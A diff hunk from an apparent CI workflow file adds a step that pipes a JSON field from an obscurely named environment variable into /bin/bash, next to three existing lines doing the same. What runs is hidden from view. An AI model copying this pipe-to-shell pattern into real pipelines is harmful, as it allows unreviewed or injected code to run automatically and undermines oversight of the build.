@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$xes95" | jq -r .epcp800 | /bin/bash
           printf '%s' "$v5400" | jq -r .zrth2 | /bin/bash
           echo $kga25 | jq -r .y37 | /bin/bash
+          printf '%s' "$n31789" | jq -r .euaz759 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
